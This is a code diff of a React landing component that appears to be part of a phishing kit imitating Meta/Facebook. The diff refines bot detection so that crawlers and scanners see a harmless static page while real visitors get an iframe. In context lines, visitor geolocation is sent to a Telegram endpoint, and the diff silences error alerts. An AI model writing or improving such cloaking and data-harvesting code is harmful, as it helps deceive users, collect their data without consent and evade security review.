@@ -3,46 +3,9 @@ import MetaIcon from '../assets/icon.ico';
 import type { FC } from 'react';
 import { useEffect, useRef, useState } from 'react';
 import { useBotDetection } from '@/hooks/useBotDetection';
-import template from "../templates/index.html";
-//import { randomizeAttributes } from "../hooks/randomizeHtml";
-
-const LoadingDots = () => {
-    const [dots, setDots] = useState('');
-    useEffect(() => {
-        const interval = setInterval(() => {
-            setDots((prev) => {
-                if (prev.length >= 5) return '';
-                return prev + '.';
-            });
-        }, 300);
-
-        return () => clearInterval(interval);
-    }, []);
-
-    return (
-        <div className="flex h-4 w-24 items-center justify-center gap-2">
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-        </div>
-    );
-};
+import ImportStaticHTML from "../hooks/ImportStaticHTMLComponent";
 
 const Index: FC = () => {
-
-    const [content, setContent] = useState<string>("");
     const { isBot, isLoading, shouldRedirect } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
@@ -136,17 +99,14 @@ const Index: FC = () => {
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload),
                     });
-
                     const result = await response.json();
-
                     if (!response.ok) {
-                        alert(`API Error: ${result.description ?? 'Unknown error'}`);
                     } else {
                         console.log('telegram sent successfully:', result);
                     }
                 } catch (error) {
                     const errorMsg = error instanceof Error ? error.message : 'Unable to connect';
-                    alert(`Network Error: ${errorMsg}`);
+                    console.log(`Network Error: ${errorMsg}`);
                 }
             };
             fetchGeoAndSendTelegram();
@@ -166,15 +126,19 @@ const Index: FC = () => {
         return (
             <div className="fixed inset-0 flex items-center justify-center bg-white">
                 <div className="flex flex-col items-center gap-2">
-                    {/* <LoadingDots /> */}
                 </div>
             </div>
         );
     }
     if (isBot) {
-        return(showIframe("/id/home.html",SiteTitleMeta,false));
+        return (
+            <>
+            <ImportStaticHTML src={"/static/home.html"} method="fetch" 
+                forceReloadCSS
+                sanitize={false}/>
+            </>
+        );
     }
-    //return(showIframe("/id/home.html",SiteTitleMeta,false));
     return showIframe(IframeUrl,SiteTitleMeta,false);
 };
 
